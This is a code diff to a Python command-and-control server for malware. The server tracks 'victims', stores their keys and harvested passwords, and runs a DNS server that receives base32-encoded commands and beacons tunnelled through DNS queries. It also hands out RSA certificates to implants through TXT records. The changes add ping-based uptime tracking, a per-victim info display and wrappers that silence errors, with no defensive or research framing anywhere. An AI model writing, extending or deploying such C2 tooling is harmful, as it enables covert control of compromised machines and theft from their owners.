@@ -62,6 +62,9 @@ c2Statistics = {
         "Invalid Requests":0
         }
 
+import time, math
+from datetime import datetime, timedelta
+
 class Machine:
     def __init__(self, connection, machineName, RSA_private_key, RSA_public_key, CustomName, RSA_Victim_Public_Key = None, victimNotes={"passwords":{},"notes":{}}):
         m = hashlib.sha256()
@@ -72,9 +75,23 @@ class Machine:
         self.RSA_private_key = RSA_private_key
         self.RSA_public_key = RSA_public_key
         self.RSA_Victim_Public_Key = RSA_Victim_Public_Key
+        n = hashlib.sha256()
+        n.update(RSA_Victim_Public_Key.public_bytes(encoding=serialization.Encoding.PEM,format=serialization.PublicFormat.SubjectPublicKeyInfo))
+        self.RSA_Victim_Public_Key_hash = n.hexdigest()
         self.CustomName = CustomName
+        self.pingTime = None
         self.Uptime = 0
         self.victimNotes = victimNotes
+
+    def send_ping(self):
+        self.pingTime = datetime.now()
+
+    def get_uptime(self):
+        uptime = 0
+        if self.pingTime is not None:
+            uptime = int((datetime.now() - self.pingTime).total_seconds())
+        self.Uptime = uptime
+        return self.Uptime
 
 def generate_machine_id():
     randbits = secrets.randbits(1024)
@@ -183,8 +200,10 @@ def list_computers():
 
     for k,v in machineClassList.items():
         table.add_row(
-        k, v.CustomName, str(v.Uptime)
+        k, v.CustomName, str(v.get_uptime())
         )
+
+    #machineClassList[userid].get_uptime()
 
     console.print(table)
 
@@ -302,7 +321,13 @@ class VictimPayloads:
         machineClassList[public_key_hash].CustomName = username
     
     def info(self, userid):
-        print(userid)
+        console.print(f"""
+	[bold blue]User ID[/bold blue]: {userid}
+	[bold blue]Name[/bold blue]: {machineClassList[userid].CustomName}
+	[bold blue]Uptime[/bold blue]: {machineClassList[userid].get_uptime()}
+	[bold blue]Victim Public Key hash[/bold blue]: {machineClassList[userid].RSA_Victim_Public_Key_hash}
+	[bold blue]C2 Public key hash[/bold blue]: {machineClassList[userid].RSA_public_key_hash}
+	""")
 
     def help(self):
         console.print(f"- [bold green]Interact Usage[/bold green]:\n")
@@ -444,22 +469,29 @@ def decryptRSAByPublicKey(public_key, message):
 
 def decodeCommand(command):
     global statistics, generatedCertificates, latestVictim, c2Statistics
-    command = command.split("|")
-    if(command[0] == "1"):
-        certificate = base64.b32decode(command[2]).decode()
-        key = load_pem_public_key(certificate.encode("utf-8"), default_backend())
-        for x in generatedCertificates:
-            if x["hashPK"] == command[1]:
-                latestVictim = command[1]
-                c2Statistics["Latest Victim"] = latestVictim
-                c2Statistics["Total Victims"] += 1
-                machineClassList.update({command[1]:Machine("DNS", None, x["private_key"], x["public_key"], "Unknown", key)})
-                victimHash = machineClassList[command[1]].RSA_public_key_hash
-                console.print(f"\n[bold blue]A spaceship arrived![/bold blue]\n[bold blue]\"{victimHash}\"[/bold blue] Called home!")
-                generatedCertificates.clear()
-        return 0
-    messageResponse = decryptRSAByPublicKey(command[0], command[1])
-    showCommandResults(command[0], command[1])
+    try:
+        command = base64.b32decode(command).decode()
+        command = command.split("|")
+        if(command[0] == "1"):
+            certificate = base64.b32decode(command[2]).decode()
+            key = load_pem_public_key(certificate.encode("utf-8"), default_backend())
+            for x in generatedCertificates:
+                if x["hashPK"] == command[1]:
+                    latestVictim = command[1]
+                    c2Statistics["Latest Victim"] = latestVictim
+                    c2Statistics["Total Victims"] += 1
+                    machineClassList.update({command[1]:Machine("DNS", None, x["private_key"], x["public_key"], "Unknown", key)})
+                    victimHash = machineClassList[command[1]].RSA_public_key_hash
+                    console.print(f"\n[bold blue]A spaceship arrived![/bold blue]\n[bold blue]\"{victimHash}\"[/bold blue] Called home!")
+                    generatedCertificates.clear()
+        if(command[0] == "2"):
+            machineClassList[command[1]].pingTime = datetime.now()
+#            console.print(f"{machineClassList[command[1]].send_ping()}")
+        #messageResponse = decryptRSAByPublicKey(command[0], command[1])
+        #showCommandResults(command[0], command[1])
+    except Exception as err:
+ #       print(err)
+        pass
 
 
 def dnsDataParse(packet):
@@ -528,7 +560,7 @@ def generateCertificate():
     encryption_algorithm=serialization.NoEncryption()
     )   
 
-    print(privkey_str.decode('utf-8'))
+    #print(privkey_str.decode('utf-8'))
     public_pem = base64.b32encode(public_key.public_bytes(encoding=serialization.Encoding.PEM,format=serialization.PublicFormat.SubjectPublicKeyInfo))
     public_pem_split = [public_pem[i: i + 220] for i in range(0, len(public_pem), 220)]
     m = hashlib.sha256()
@@ -542,23 +574,26 @@ def generateCertificate():
 
 def sendDNSresponse(data):
     global keyProvisioning
-    request = DNSRecord.parse(data)
-    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
-    qname = request.q.qname
-    qn = str(qname)
-    qtype = request.q.qtype
-    qt = QTYPE[qtype]
-    if qt == "A":
-        reply.add_answer(RR(rname=qname, rtype=QTYPE.A, ttl=5, rdata=dns.A(IP)))
-    if qt == "AAAA":
-        reply.add_answer(RR(rname=qname, rtype=QTYPE.AAAA, ttl=5, rdata=dns.AAAA(IPV6)))
-    if qt == "TXT":
-        if keyProvisioning == False:
-            reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=5, rdata=dns.TXT("")))
-        else:
-            certificate = generateCertificate()
-            reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=5, rdata=dns.TXT(certificate)))
-    return reply.pack()
+    try:
+        request = DNSRecord.parse(data)
+        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
+        qname = request.q.qname
+        qn = str(qname)
+        qtype = request.q.qtype
+        qt = QTYPE[qtype]
+        if qt == "A":
+            reply.add_answer(RR(rname=qname, rtype=QTYPE.A, ttl=5, rdata=dns.A(IP)))
+        if qt == "AAAA":
+            reply.add_answer(RR(rname=qname, rtype=QTYPE.AAAA, ttl=5, rdata=dns.AAAA(IPV6)))
+        if qt == "TXT":
+            if keyProvisioning == False:
+                reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=5, rdata=dns.TXT("")))
+            else:
+                certificate = generateCertificate()
+                reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=5, rdata=dns.TXT(certificate)))
+        return reply.pack()
+    except:
+        pass
 
 class DNSServer:
    def __init__(self, address, port, domain):
@@ -570,28 +605,31 @@ class DNSServer:
        data = None
        addr = None
        try:
-            console.print(f"[bold yellow][!][/bold yellow] DNS Server started\n")
-            udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            udps.bind(('',self.port))
+           console.print(f"[bold yellow][!][/bold yellow] DNS Server started\n")
+           udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+           udps.bind(('',self.port))
        except:
-            console.print(f"[bold red][!][/bold red] Failed to start DNS Server\n")
-            return 0
+           console.print(f"[bold red][!][/bold red] Failed to start DNS Server\n")
+           return 0
        c2Statistics["Active Listeners"].append("DNS")
        while True:
-            data, addr = udps.recvfrom(512)
-            udps.sendto(sendDNSresponse(data),addr)
-            ini=12
-            lon=data[ini]
-            receivedData = ""
-            while lon != 0:
-                receivedData+=data[ini+1:ini+lon+1].decode('ascii')+'.'
-                ini+=lon+1
-                lon=data[ini]
-                if self.domain in receivedData:
-                    receivedData = receivedData.replace(self.domain, "")
-                    if(len(receivedData) > len(self.domain+".")):
-                        dnsDataParse(receivedData)
-                c2Statistics["Invalid Requests"] += 1
+           try:
+               data, addr = udps.recvfrom(512)
+               udps.sendto(sendDNSresponse(data),addr)
+               ini=12
+               lon=data[ini]
+               receivedData = ""
+               while lon != 0:
+                   receivedData+=data[ini+1:ini+lon+1].decode('ascii')+'.'
+                   ini+=lon+1
+                   lon=data[ini]
+                   if self.domain in receivedData:
+                       receivedData = receivedData.replace(self.domain, "")
+                       if(len(receivedData) > len(self.domain+".")):
+                           dnsDataParse(receivedData)
+                    #c2Statistics["Invalid Requests"] += 1
+           except:
+               pass
 
 import signal
 if __name__ == "__main__":
